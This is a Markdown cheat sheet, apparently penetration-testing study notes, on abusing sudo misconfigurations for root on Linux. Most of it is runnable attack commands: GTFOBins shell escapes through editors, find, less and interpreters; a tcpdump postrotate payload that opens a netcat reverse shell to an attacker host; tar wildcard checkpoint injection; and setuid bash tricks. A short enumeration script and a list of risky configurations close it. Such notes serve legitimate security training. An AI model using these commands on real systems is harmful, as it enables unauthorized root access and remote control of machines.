# ⚡ Sudo Rights Abuse

## 🎯 Overview

Sudo privilege misconfigurations allow users to execute commands as root or other users, often providing direct privilege escalation vectors through GTFOBins exploitation.

## 🔍 Sudo Enumeration

### Check Sudo Privileges
```bash
# List sudo permissions
sudo -l

# Check without password (NOPASSWD entries)
sudo -l -U username

# Example output:
# User htb-student may run the following commands:
#     (root) NOPASSWD: /usr/sbin/tcpdump
```

### Sudo Configuration Files
```bash
# Main sudoers file
cat /etc/sudoers

# Additional configs
ls -la /etc/sudoers.d/
cat /etc/sudoers.d/*
```

## 🎯 Common Vulnerable Sudo Entries

### High-Risk Commands
```bash
# Text editors
(root) NOPASSWD: /usr/bin/nano
(root) NOPASSWD: /usr/bin/vim

# File operations
(root) NOPASSWD: /bin/cp
(root) NOPASSWD: /bin/mv

# Interpreters
(root) NOPASSWD: /usr/bin/python*
(root) NOPASSWD: /usr/bin/perl

# System tools
(root) NOPASSWD: /usr/bin/find
(root) NOPASSWD: /usr/bin/less
```

## 🚀 GTFOBins Exploitation

### Text Editor Abuse
```bash
# nano sudo exploit
sudo nano
# Ctrl+R Ctrl+X
# Command: reset; bash 1>&0 2>&0

# vim sudo exploit
sudo vim -c ':!/bin/bash'

# vi sudo exploit
sudo vi
# :!/bin/bash
```

### System Command Abuse
```bash
# find sudo exploit
sudo find . -exec /bin/bash \; -quit

# less sudo exploit
sudo less /etc/passwd
# !/bin/bash

# more sudo exploit
sudo more /etc/passwd
# !/bin/bash
```

### Interpreter Abuse
```bash
# python sudo exploit
sudo python -c "import os; os.system('/bin/bash')"
sudo python3 -c "import os; os.system('/bin/bash')"

# perl sudo exploit
sudo perl -e 'exec "/bin/bash";'
```

## 🔧 Advanced Sudo Abuse

### tcpdump Postrotate Exploitation
```bash
# Create payload script
cat > /tmp/.test << EOF
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker_ip 443 >/tmp/f
EOF

# Make executable
chmod +x /tmp/.test

# Execute with tcpdump
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

### Command Injection in Arguments
```bash
# If sudo allows: /bin/cp /home/user/file1 /etc/
# Try: sudo /bin/cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash

# If sudo allows: /usr/bin/systemctl restart *
# Try: sudo systemctl restart ../../bin/bash
```

### Wildcard Abuse in Sudo
```bash
# If sudo entry: (root) NOPASSWD: /bin/tar -czf /backup/*.tar.gz *
# Create malicious files:
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

## 🔍 Enumeration & Discovery

### Sudo Audit Script
```bash
#!/bin/bash
echo "=== SUDO RIGHTS ENUMERATION ==="

echo "[+] Current user sudo privileges:"
sudo -l 2>/dev/null || echo "No sudo access or password required"

echo "[+] Sudoers file (if readable):"
cat /etc/sudoers 2>/dev/null | grep -v "^#" | grep -v "^$"

echo "[+] Additional sudoers files:"
ls -la /etc/sudoers.d/ 2>/dev/null

echo "[+] GTFOBins check for sudo commands:"
sudo -l 2>/dev/null | grep -E "\(/.*\)" | while read line; do
    cmd=$(echo $line | grep -oE "/[^[:space:]]*" | xargs basename)
    echo "Check GTFOBins for: $cmd"
done
```

### Specific Command Analysis
```bash
# Extract allowed commands from sudo -l
sudo -l | grep -E "NOPASSWD:" | awk '{print $NF}'

# Check if commands exist in GTFOBins
for cmd in $(sudo -l | grep NOPASSWD | awk '{print $NF}' | xargs basename); do
    echo "Check GTFOBins for: $cmd"
done
```

## 🔑 Quick Reference

### Immediate Escalation Commands
```bash
# Check sudo first
sudo -l

# Common quick wins:
sudo nano -> Ctrl+R Ctrl+X -> reset; bash 1>&0 2>&0
sudo vim -> :!/bin/bash
sudo find -> sudo find . -exec /bin/bash \; -quit
sudo less -> !/bin/bash
sudo python -> sudo python -c "import os; os.system('/bin/bash')"
```

### Emergency Sudo Checks
```bash
# Can we run anything?
sudo -l

# Try common commands
sudo su -
sudo bash
sudo sh

# Check for wildcards
sudo -l | grep "\*"
```

## ⚠️ Dangerous Sudo Configurations

### Red Flags
- **NOPASSWD entries** - No authentication required
- **Wildcard permissions** - `*` in command paths
- **Text editors** - Direct root shell access
- **Interpreters** - Full system access
- **ALL permissions** - `(ALL) ALL` entries

### Privilege Escalation Vectors
1. **Direct shell access** - vim, nano, less
2. **Command execution** - find, awk, sed with -exec
3. **File manipulation** - cp, mv to overwrite system files
4. **Library hijacking** - LD_PRELOAD with sudo
5. **Environment variables** - Exploiting env_keep settings

---

*Sudo misconfigurations are among the most common privilege escalation vectors - a single poorly configured sudo entry can provide immediate root access through GTFOBins exploitation.* 